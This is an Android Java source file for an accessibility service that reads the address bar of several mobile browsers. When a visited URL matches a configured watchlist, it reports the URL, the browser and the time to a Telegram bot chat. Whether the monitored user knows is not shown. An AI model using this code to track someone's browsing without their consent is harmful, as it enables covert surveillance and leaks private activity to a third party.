package com.monitor.telegramsite;

import android.accessibilityservice.AccessibilityService;
import android.content.SharedPreferences;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class BrowserMonitorService extends AccessibilityService {

    private static final String TAG = "BrowserMonitorService";

    private static final String[] URL_BAR_IDS = {
            "com.android.chrome:id/url_bar",
            "com.chrome.beta:id/url_bar",
            "com.chrome.dev:id/url_bar",
            "org.mozilla.firefox:id/mozac_browser_toolbar_url_view",
            "com.opera.browser:id/url_field",
            "com.microsoft.emmx:id/url_bar",
            "com.brave.browser:id/url_bar",
            "com.sec.android.app.sbrowser:id/location_bar_edit_text",
            "com.UCMobile.intl:id/webview_tab_title_url"
    };

    private String lastNotifiedUrl = "";
    private SharedPreferences prefs;
    private final TelegramNotifier notifier =
            new TelegramNotifier(Config.BOT_TOKEN, Config.CHAT_ID);

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences(MainActivity.PREFS_NAME, MODE_PRIVATE);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!prefs.getBoolean(MainActivity.KEY_ENABLED, false)) return;

        int type = event.getEventType();
        if (type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
                type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return;

        String url = extractUrl(event);
        if (url == null || url.isEmpty()) return;

        String normalized = normalize(url);
        if (normalized.isEmpty() || normalized.equals(lastNotifiedUrl)) return;

        if (isMonitored(normalized)) {
            lastNotifiedUrl = normalized;
            Log.d(TAG, "Совпадение: " + normalized);
            sendAlert(normalized, String.valueOf(event.getPackageName()));
        }
    }

    private String extractUrl(AccessibilityEvent event) {
        for (CharSequence t : event.getText()) {
            if (t != null && looksLikeUrl(t.toString())) return t.toString();
        }
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return null;
        try {
            for (String id : URL_BAR_IDS) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
                if (nodes != null && !nodes.isEmpty() && nodes.get(0).getText() != null)
                    return nodes.get(0).getText().toString();
            }
            return findUrlInTree(root);
        } finally {
            root.recycle();
        }
    }

    private String findUrlInTree(AccessibilityNodeInfo node) {
        if (node == null) return null;
        CharSequence text = node.getText();
        if (text != null && looksLikeUrl(text.toString())) return text.toString();
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            String found = findUrlInTree(child);
            if (child != null) child.recycle();
            if (found != null) return found;
        }
        return null;
    }

    private boolean looksLikeUrl(String t) {
        return t.startsWith("http://") || t.startsWith("https://") ||
                (t.contains(".") && !t.contains(" ") && t.length() > 4);
    }

    private String normalize(String url) {
        return url.toLowerCase().trim()
                .replaceAll("^https?://", "")
                .replaceAll("^www\\.", "");
    }

    private boolean isMonitored(String url) {
        for (String site : Config.MONITORED_SITES) {
            String s = site.toLowerCase().trim()
                    .replaceAll("^https?://", "")
                    .replaceAll("^www\\.", "");
            if (url.startsWith(s) || url.contains(s)) return true;
        }
        return false;
    }

    private void sendAlert(String url, String pkg) {
        String browser = friendlyName(pkg);
        String msg = String.format(
                "🌐 *Посещение сайта*\n\n" +
                "📍 URL: `%s`\n" +
                "🖥 Браузер: %s\n" +
                "⏰ Время: %s",
                url, browser,
                new java.text.SimpleDateFormat("dd.MM.yyyy HH:mm:ss",
                        java.util.Locale.getDefault()).format(new java.util.Date())
        );
        notifier.sendMessage(msg, ok -> Log.d(TAG, ok ? "Отправлено" : "Ошибка отправки"));
    }

    private String friendlyName(String pkg) {
        switch (pkg) {
            case "com.android.chrome":  return "Chrome";
            case "org.mozilla.firefox": return "Firefox";
            case "com.opera.browser":   return "Opera";
            case "com.microsoft.emmx":  return "Edge";
            case "com.brave.browser":   return "Brave";
            case "com.sec.android.app.sbrowser": return "Samsung Browser";
            default: return pkg;
        }
    }

    @Override public void onInterrupt() {}
}
